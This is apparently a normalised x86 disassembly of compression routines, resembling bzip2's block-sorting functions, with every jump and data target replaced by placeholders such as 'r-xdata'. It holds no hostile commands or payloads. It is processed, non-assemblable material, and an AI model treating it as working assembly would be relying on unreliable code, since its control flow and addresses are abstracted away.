inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
cmp edi edx
jb r-xdata
cmp esi edx
jb r-xdata
sub edi edx
sub [ ebp + 0x8 ] 0x8
mov edx [ ebp + 0x10 ]
dec [ edx ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
sub esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
xor al al
sub_1001ef06
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x14 ]
sub esp 0x1c
inc eax
cmp eax 0x2
jl r-xdata
leave
retn
xor ecx ecx
cmp [ rw-data ] eax
jge r-xdata
dec ecx
mov [ ebp - 0x18 ] ecx
js r-xdata
inc ecx
cmp [ ecx * 4 + rw-data ] eax
jl r-xdata
push ebx
push edi
dec ecx
mov [ ebp - 0x18 ] ecx
jns r-xdata
mov ecx edi
sub ecx eax
lea ebx [ esi + ecx * 4 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ ebp + 0x14 ]
lea edi [ eax + edx ]
cmp edi [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] edi
jg r-xdata
pop edi
pop ebx
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_1001ed20
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
inc edi
add ebx 0x4
cmp edi [ ebp + 0x18 ]
mov [ esi + ecx * 4 ] eax
jg r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1001ed20
add esp 0xc
test al al
jne r-xdata
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_1001ed20
add esp 0xc
test al al
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ esi + ecx * 4 ] eax
mov eax [ ebp + 0x20 ]
inc edi
add ebx 0x4
cmp [ eax ] 0x0
jl r-xdata
mov eax ebx
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1001ed20
add esp 0xc
test al al
jne r-xdata
cmp edi [ ebp + 0x18 ]
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + edx * 4 ] ecx
mov ecx [ ebp - 0x10 ]
sub [ ebp - 0x4 ] ecx
shl ecx 0x2
sub eax ecx
mov ecx [ ebp - 0x14 ]
dec ecx
cmp [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ esi + edi * 4 ]
mov ecx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea edx [ eax + ecx ]
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edx
call sub_1001ed20
add esp 0xc
test al al
je r-xdata
push [ ebp + 0x20 ]
mov eax [ eax ]
add eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1001ed20
add esp 0xc
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
sub_1001f11c
push ebp
mov ebp esp
sub esp 0x508
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1e8 ] eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
push edi
mov [ ebp - 0x378 ] eax
mov [ ebp - 0x508 ] 0x2
inc ebx
push 0x3e9
call sub_100196de
dec ebx
lea ecx [ ebp + ebx * 4 - 0x378 ]
mov edi [ ecx ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp + ebx * 4 - 0x508 ]
mov edx [ ecx ]
lea eax [ ebp + ebx * 4 - 0x1e8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] eax
mov eax [ eax ]
mov ecx edi
sub ecx eax
cmp ecx 0x14
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x20 ] eax
jl r-xdata
push [ ebp + 0x1c ]
push edx
push edi
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1001ef06
mov eax [ ebp + 0x1c ]
add esp 0x1c
cmp [ eax ] 0x0
jl r-xdata
cmp edx 0xe
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ebx ebx
jg r-xdata
lea ecx [ edi + eax ]
sar ecx 0x1
mov ebx [ esi + ecx * 4 ]
mov ecx [ ebp + 0xc ]
add ebx edx
mov bl [ ebx + ecx ]
mov [ ebp - 0x18 ] bl
mov ebx [ esi + edi * 4 ]
add ebx edx
mov bl [ ebx + ecx ]
mov [ ebp + 0x18 ] bl
mov ebx [ esi + eax * 4 ]
add ebx edx
mov cl [ ebx + ecx ]
mov [ ebp - 0x4 ] cl
cmp cl [ ebp + 0x18 ]
jbe r-xdata
cmp ebx 0x62
jge r-xdata
mov cl [ ebp - 0x18 ]
cmp [ ebp + 0x18 ] cl
jbe r-xdata
mov bl [ ebp + 0x18 ]
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x18 ] cl
movzx ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp + 0x18 ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edi
mov eax edi
mov bl [ ebp - 0x4 ]
mov [ ebp + 0x18 ] cl
cmp bl cl
jbe r-xdata
mov ebx [ ebp - 0xc ]
cmp [ ebp - 0x10 ] ebx
jge r-xdata
mov ecx [ ebp + 0x18 ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
add ecx edx
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp + 0x18 ] bl
mov ecx [ ebp + 0x18 ]
sub ecx ebx
mov [ ebp - 0x14 ] ecx
mov ecx ebx
sub ecx [ ebp - 0x20 ]
mov ebx [ ebp - 0x14 ]
cmp ecx ebx
jge r-xdata
mov eax [ ebp - 0x4c ]
mov ebx [ ebp - 0x48 ]
inc edx
mov [ eax ] edx
inc ebx
jmp r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp + 0x18 ]
mov [ esi + ebx * 4 ] ecx
mov ebx [ ebp - 0xc ]
inc [ ebp - 0xc ]
inc [ ebp + 0x18 ]
cmp [ ebp + 0x18 ] eax
mov ecx [ ebp - 0x14 ]
mov [ esi + ebx * 4 ] ecx
jle r-xdata
mov [ ebp - 0x8 ] ebx
test ebx ebx
jle r-xdata
mov ebx ecx
inc [ ebp + 0x18 ]
jmp r-xdata
cmp [ ebp + 0x18 ] eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx eax
mov [ ebp - 0x1c ] ecx
mov ecx edi
sub ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ esi + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x18 ]
sub ecx ebx
lea ecx [ esi + ecx * 4 ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp + 0x18 ] eax
jg r-xdata
mov ecx [ esi + eax * 4 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
add ecx edx
movzx ecx [ ecx + ebx ]
sub ecx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0x8 ] ecx
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
mov ebx [ ebx ]
mov ecx [ ecx ]
mov [ ebp - 0x54 ] ebx
mov ebx [ ebp - 0xc ]
add [ ebp - 0xc ] 0x4
mov [ ebx ] ecx
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x54 ]
mov [ ecx ] ebx
add ecx 0x4
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1c ] ecx
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ esi + ecx * 4 ]
mov ebx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
mov [ esi + eax * 4 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ esi + ebx * 4 ] ecx
jmp r-xdata
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x14 ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + esi - 0x1 ]
mov [ ebp - 0x2c ] esi
lea eax [ eax + edi + 0x1 ]
lea esi [ ecx + 0x1 ]
mov [ ebp - 0x24 ] esi
lea esi [ eax - 0x1 ]
mov [ ebp - 0x30 ] esi
lea esi [ edx + 0x1 ]
mov [ ebp - 0x3c ] esi
mov ebx ecx
sub ebx [ ebp - 0x20 ]
mov esi edi
sub esi eax
cmp ebx esi
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x40 ] edx
jge r-xdata
mov ebx [ ebp + 0x18 ]
lea ebx [ esi + ebx * 4 ]
mov [ ebp + 0x18 ] ebx
mov ebx edi
sub ebx ecx
lea ecx [ esi + ebx * 4 + 0x4 ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x18 ]
cmp ecx eax
jg r-xdata
dec eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ebp - 0x40 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x44 ] edx
mov eax edx
jmp r-xdata
mov ebx [ esi ]
mov [ ebp + 0x18 ] ebx
mov ebx [ ecx ]
mov [ esi ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ecx ] ebx
add esi 0x4
add ecx 0x4
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
inc [ ebp + 0x18 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ esi + eax * 4 ]
mov [ ecx ] ebx
mov ecx [ ebp - 0x14 ]
mov [ esi + eax * 4 ] ecx
dec eax
jmp r-xdata
mov ebx [ ebp - 0x38 ]
sub ebx [ ebp - 0x2c ]
mov edi ecx
sub edi esi
cmp ebx edi
jge r-xdata
mov eax esi
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax ecx
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov edi [ ebp - 0x30 ]
sub edi [ ebp - 0x24 ]
mov ebx ecx
sub ebx esi
cmp ebx edi
jge r-xdata
mov edi [ ebp - 0x2c ]
mov ebx [ ebp - 0x38 ]
mov ebx [ ebp - 0x2c ]
mov edi esi
mov esi ebx
mov ebx [ ebp - 0x38 ]
mov [ ebp + 0x18 ] ebx
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov eax edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
mov [ edx ] edi
mov edx [ ebp - 0x58 ]
mov edi [ ebp - 0x44 ]
mov [ edx ] ebx
mov ebx [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
inc ebx
mov [ ebp + ebx * 4 - 0x1e8 ] esi
mov esi [ ebp + 0x8 ]
mov [ edx ] edi
mov [ ebp + ebx * 4 - 0x508 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp + ebx * 4 - 0x378 ] ecx
inc ebx
mov [ ebp + ebx * 4 - 0x1e8 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp + ebx * 4 - 0x378 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp + ebx * 4 - 0x508 ] eax
inc ebx
jmp r-xdata
sub_1001f48c
push ebp
lea ebp [ esp - 0x188 ]
sub esp 0xd2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x184 ] eax
cmp [ ebp + 0x198 ] 0x4
mov eax [ ebp + 0x190 ]
push ebx
push edi
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x19c ]
mov ebx ecx
mov edi edx
mov [ ebp + 0x6c ] ebx
mov [ ebp + 0x70 ] edi
mov [ ebp + 0x5c ] eax
jl r-xdata
mov eax 0x10000
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
and [ esi + eax * 4 ] 0x0
dec eax
jns r-xdata
movzx ecx [ edi ]
mov edx [ ebp + 0x194 ]
shl ecx 0x8
dec edx
cmp edx 0x3
jl r-xdata
test edx edx
jl r-xdata
mov eax [ ebp + 0x64 ]
lea edi [ eax + edx * 2 - 0x4 ]
mov edi [ ebp + 0x70 ]
mov edi [ ebp + 0x64 ]
xor eax eax
mov [ edi + edx * 2 ] ax
mov edi [ ebp + 0x70 ]
movzx eax [ edi + edx ]
shl eax 0x8
sar ecx 0x8
or ecx eax
inc [ esi + ecx * 4 ]
dec edx
jns r-xdata
xor eax eax
mov [ edi + 0x4 ] ax
mov eax [ ebp + 0x70 ]
movzx eax [ eax + edx ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi + 0x2 ] cx
mov ecx [ ebp + 0x70 ]
movzx ecx [ ecx + edx - 0x1 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
xor eax eax
mov [ edi ] ax
mov eax [ ebp + 0x70 ]
movzx eax [ eax + edx - 0x2 ]
sar ecx 0x8
shl eax 0x8
or eax ecx
inc [ esi + eax * 4 ]
xor ecx ecx
mov [ edi - 0x2 ] cx
mov ecx [ ebp + 0x70 ]
movzx ecx [ ecx + edx - 0x3 ]
shl ecx 0x8
sar eax 0x8
or ecx eax
inc [ esi + ecx * 4 ]
sub edx 0x4
sub edi 0x8
cmp edx 0x3
jge r-xdata
mov cl [ edi + eax ]
mov edx [ ebp + 0x68 ]
mov [ edx + eax ] cl
mov edx [ ebp + 0x78 ]
add [ ebp + 0x78 ] 0x2
xor ecx ecx
inc eax
cmp eax 0x22
mov [ edx ] cx
jl r-xdata
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
jmp r-xdata
xor ecx ecx
inc ecx
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
mov ecx [ ebp + 0x194 ]
mov edx [ ebp + 0x64 ]
lea edx [ edx + ecx * 2 ]
xor eax eax
add ecx edi
mov [ ebp + 0x78 ] edx
mov [ ebp + 0x68 ] ecx
mov edx [ esi + ecx * 4 - 0x4 ]
lea eax [ esi + ecx * 4 ]
add [ eax ] edx
inc ecx
cmp ecx 0x10000
jle r-xdata
movzx ax [ edi ]
mov edx [ ebp + 0x194 ]
shl ax 0x8
dec edx
cmp edx 0x3
movzx ecx ax
jl r-xdata
test edx edx
jl r-xdata
mov edi [ ebp + 0x70 ]
or [ ebp + 0x78 ] 0xffffffff
sub [ ebp + 0x78 ] edi
mov [ ebp + 0x80 ] 0xfffffffe
sub [ ebp + 0x80 ] edi
lea eax [ edi + edx - 0x1 ]
push 0x100
xor edi edi
lea eax [ ebp + 0x84 ]
push edi
push eax
call sub_10027650
add esp 0xc
mov eax [ ebp + 0x70 ]
movzx ax [ eax + edx ]
shl ax 0x8
shr cx 0x8
or ax cx
movzx ecx ax
movzx eax cx
lea edi [ esi + eax * 4 ]
mov eax [ edi ]
dec eax
mov [ edi ] eax
mov [ ebx + eax * 4 ] edx
dec edx
jns r-xdata
movzx di [ eax + 0x1 ]
shr cx 0x8
shl di 0x8
or di cx
movzx edi di
movzx ecx di
lea ebx [ esi + ecx * 4 ]
mov ecx [ ebx ]
dec ecx
mov [ ebx ] ecx
mov ebx [ ebp + 0x6c ]
mov [ ebx + ecx * 4 ] edx
movzx cx [ eax ]
shl cx 0x8
shr di 0x8
or cx di
movzx ecx cx
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
lea edi [ edx - 0x1 ]
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x1 ]
mov ecx [ ebp + 0x74 ]
shl di 0x8
shr cx 0x8
or di cx
movzx ecx di
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x78 ]
add edi eax
mov [ ebx + ecx * 4 ] edi
movzx di [ eax - 0x2 ]
mov ecx [ ebp + 0x74 ]
shr cx 0x8
shl di 0x8
or di cx
movzx ecx di
mov [ ebp + 0x74 ] ecx
movzx ecx cx
lea edi [ esi + ecx * 4 ]
mov ecx [ edi ]
dec ecx
mov [ edi ] ecx
mov edi [ ebp + 0x80 ]
add edi eax
sub edx 0x4
sub eax 0x4
cmp edx 0x3
mov [ ebx + ecx * 4 ] edi
mov ecx [ ebp + 0x74 ]
jge r-xdata
mov [ ebp + edi * 4 - 0x3a4 ] edi
inc edi
cmp edi 0xff
jle r-xdata
xor eax eax
inc eax
imul eax eax 0x3
inc eax
cmp eax 0x100
jle r-xdata
mov [ ebp + 0x7c ] eax
cmp [ ebp + 0x7c ] 0x1
jne r-xdata
lea eax [ ebp - 0x3a4 ]
mov [ ebp + 0x78 ] eax
mov eax [ ebp + 0x7c ]
push 0x3
cdq
pop ecx
idiv ecx
cmp eax 0xff
mov [ ebp + 0x7c ] eax
mov [ ebp + 0x74 ] eax
jg r-xdata
and [ ebp + 0x78 ] 0x0
and [ ebp + 0x74 ] 0x0
inc [ ebp + 0x74 ]
mov eax [ ebp + 0x6c ]
add [ ebp + 0x78 ] 0x4
cmp [ ebp + 0x74 ] 0xff
mov [ ebp + edi * 4 - 0x3a4 ] eax
jle r-xdata
mov eax [ ebp + 0x78 ]
jmp r-xdata
inc [ ebp + 0x7c ]
cmp [ ebp + 0x7c ] 0xff
jle r-xdata
shl eax 0x8
add eax [ ebp + 0x7c ]
lea eax [ esi + eax * 4 ]
mov [ ebp + 0x6c ] eax
mov eax [ eax ]
test eax 0x200000
jne r-xdata
mov edi [ ebp + 0x74 ]
mov eax [ ebp + edi * 4 - 0x3a4 ]
mov ecx [ ebp + 0x78 ]
mov ecx [ ecx ]
mov [ ebp + 0x6c ] eax
shl eax 0xa
shl ecx 0xa
add eax esi
lea edx [ ecx + esi ]
mov ecx [ eax + 0x400 ]
sub ecx [ eax ]
mov eax [ edx + 0x400 ]
sub eax [ edx ]
cmp eax ecx
jbe r-xdata
mov edx [ eax ]
mov [ ebp + edi * 4 - 0x3a4 ] edx
mov edx [ ebp + 0x7c ]
sub edi edx
shl edx 0x2
sub eax edx
mov edx [ ebp + 0x7c ]
dec edx
cmp edi edx
mov [ ebp + 0x68 ] eax
jle r-xdata
cmp [ ebp + 0x7c ] eax
je r-xdata
lea ecx [ ebp + eax + 0x84 ]
cmp [ ecx ] 0x0
mov [ ebp + 0x60 ] ecx
jne r-xdata
mov eax [ ebp + 0x6c ]
mov ecx 0xffdfffff
and eax ecx
mov [ ebp + 0x80 ] eax
mov eax [ ebp + 0x6c ]
mov edi [ eax + 0x4 ]
and edi ecx
dec edi
cmp edi [ ebp + 0x80 ]
jle r-xdata
mov eax [ eax ]
shl eax 0xa
add eax esi
mov edx [ eax + 0x400 ]
sub edx [ eax ]
cmp edx ecx
ja r-xdata
push 0x3ee
mov edx eax
shl edx 0x2
lea ecx [ esi + edx ]
mov [ ebp + 0x7c ] ecx
mov [ ebp + 0x80 ] ecx
xor ecx ecx
or [ eax ] 0x200000
mov eax [ ebp + 0x68 ]
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
mov eax [ ebp + 0x68 ]
mov edi [ ebp + 0x80 ]
mov edi [ edi ]
and edi 0xffdfffff
mov [ ebp + ecx - 0x7a4 ] edi
mov edi [ ebp + 0x80 ]
mov edi [ edi + 0x4 ]
add [ ebp + 0x80 ] 0x400
and edi 0xffdfffff
dec edi
mov [ ebp + ecx - 0xba4 ] edi
add ecx 0x4
cmp ecx 0x3fc
jle r-xdata
shl eax 0xa
lea edi [ eax + esi ]
mov eax [ edi ]
lea ecx [ ebp + edx - 0x7a4 ]
and eax 0xffdfffff
cmp eax [ ecx ]
mov [ ebp + 0x80 ] edi
mov [ ebp + 0x68 ] ecx
jge r-xdata
push [ ebp + 0x5c ]
mov eax [ ebp + 0x80 ]
push edi
push [ ebp + 0x194 ]
push [ ebp + 0x64 ]
push [ ebp + 0x70 ]
push ebx
call sub_1001f11c
sub edi [ ebp + 0x80 ]
mov eax [ ebp + 0x78 ]
lea eax [ eax + edi + 0x1 ]
mov [ ebp + 0x78 ] eax
mov eax [ ebp + 0x5c ]
add esp 0x18
cmp [ eax ] 0x0
jl r-xdata
mov eax edi
sub eax [ ebp + 0x80 ]
inc eax
push eax
push [ ebp + 0x78 ]
push [ ebp + 0x7c ]
push [ ebp + 0x68 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x18
mov eax [ edi + 0x400 ]
lea edx [ ebp + edx - 0xba4 ]
and eax 0xffdfffff
mov [ ebp + 0x80 ] edx
jmp r-xdata
mov ecx [ ebx + eax * 4 ]
dec ecx
jns r-xdata
mov ecx [ ebp + 0x184 ]
pop edi
xor ecx ebp
pop ebx
call sub_10027150
add ebp 0x188
leave
retn
dec eax
cmp eax [ edx ]
jg r-xdata
mov edi [ ebp + 0x70 ]
movzx edi [ edi + ecx ]
cmp [ ebp + edi + 0x84 ] 0x0
jne r-xdata
add ecx [ ebp + 0x194 ]
mov ecx [ ebx + eax * 4 ]
dec ecx
jns r-xdata
mov eax [ ebp + 0x68 ]
mov eax [ eax ]
mov edx [ edx ]
lea ecx [ eax - 0x1 ]
cmp ecx edx
je r-xdata
mov ecx [ ebp + 0x68 ]
inc eax
cmp eax [ ecx ]
jl r-xdata
lea edi [ ebp + edi * 4 - 0x7a4 ]
mov [ ebp + 0x6c ] edi
mov edi [ edi ]
mov [ ebx + edi * 4 ] ecx
mov ecx [ ebp + 0x6c ]
inc edi
mov [ ecx ] edi
mov edx [ ebp + 0x70 ]
movzx edx [ edx + ecx ]
cmp [ ebp + edx + 0x84 ] 0x0
jne r-xdata
add ecx [ ebp + 0x194 ]
mov eax [ ebp + 0x7c ]
mov ecx 0x100
test eax eax
jne r-xdata
mov edi [ ebp + 0x80 ]
mov edx [ ebp + 0x80 ]
lea edx [ ebp + edx * 4 - 0xba4 ]
mov [ ebp + 0x6c ] edx
mov edx [ edx ]
mov [ ebx + edx * 4 ] ecx
mov ecx [ ebp + 0x6c ]
dec edx
mov [ ecx ] edx
or [ eax ] 0x200000
add eax 0x400
dec ecx
jne r-xdata
cmp [ ebp + 0x74 ] 0xff
mov eax [ ebp + 0x60 ]
mov [ eax ] 0x1
jge r-xdata
push 0x3ef
jmp r-xdata
mov eax [ ebp + 0x194 ]
dec eax
cmp edx eax
jne r-xdata
inc [ ebp + 0x74 ]
cmp [ ebp + 0x74 ] 0xff
jle r-xdata
mov edx [ edi ]
mov eax [ edi + 0x400 ]
and [ ebp + 0x80 ] 0x0
mov ecx 0xffdfffff
and edx ecx
and eax ecx
sub eax edx
cmp eax 0xfffe
jle r-xdata
call sub_100196de
mov eax [ ebp + 0x74 ]
mov eax [ ebp + eax * 4 - 0x3a4 ]
and [ ebp + 0x7c ] 0x0
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x198 ] 0x4
jl r-xdata
dec eax
mov [ ebp + 0x60 ] eax
mov [ ebp + 0x7c ] eax
js r-xdata
inc [ ebp + 0x80 ]
mov ecx [ ebp + 0x80 ]
mov edi eax
sar edi cl
cmp edi 0xfffe
jg r-xdata
mov eax [ ebp + 0x194 ]
sub eax [ ebp + 0x78 ]
push eax
push [ ebp + 0x78 ]
push [ ebp + 0x194 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x14
mov ecx [ ebp + 0x80 ]
sar eax cl
cmp eax 0xffff
jg r-xdata
add edx eax
lea edi [ ebx + edx * 4 ]
push 0x3ea
jmp r-xdata
dec [ ebp + 0x7c ]
sub edi 0x4
cmp [ ebp + 0x7c ] 0x0
jge r-xdata
mov eax [ ebp + 0x194 ]
add edx eax
mov eax [ ebp + 0x64 ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp + 0x80 ]
mov eax [ ebp + 0x7c ]
mov edx [ edi ]
sar eax cl
cmp edx 0x22
movzx ecx ax
mov eax [ ebp + 0x64 ]
mov [ eax + edx * 2 ] cx
jge r-xdata
mov eax [ ebp + 0x60 ]
sub_1001fb58
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ edi + 0x20 ]
mov edx [ edi + 0x18 ]
mov ecx [ edi + 0x24 ]
push ebx
mov ebx [ edi + 0x268 ]
push esi
mov esi [ edi + 0x44 ]
cmp esi 0x2710
mov [ ebp - 0x18 ] eax
mov eax [ edi + 0x30 ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
jge r-xdata
lea edx [ esi + 0x22 ]
test dl 0x1
je r-xdata
push ebx
push esi
mov eax edx
jmp r-xdata
add edx ecx
cmp eax 0x1
mov [ ebp - 0xc ] edx
jge r-xdata
inc edx
push [ edi + 0x14 ]
push [ edi + 0x10 ]
call sub_1001e9c9
add esp 0x10
cmp eax 0x64
jle r-xdata
xor eax eax
inc eax
cmp [ edi + 0x1c ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
dec eax
push 0x3
pop ebx
cdq
idiv ebx
mov edx ecx
mov ecx [ ebp - 0x18 ]
mov ebx eax
imul ebx esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
push esi
push [ ebp - 0xc ]
mov esi [ ebp - 0x14 ]
call sub_1001f48c
add esp 0x10
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
push 0x64
pop eax
pop esi
pop ebx
leave
retn
push 0x3eb
call sub_100196de
mov [ edi + 0x1c ] eax
inc eax
cmp eax [ edi + 0x44 ]
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] 0x1
test eax eax
je r-xdata
jmp r-xdata
or [ edi + 0x1c ] 0xffffffff
xor eax eax
cmp [ edi + 0x44 ] eax
jle r-xdata
cmp [ ebp - 0x4 ] 0x2
jl r-xdata
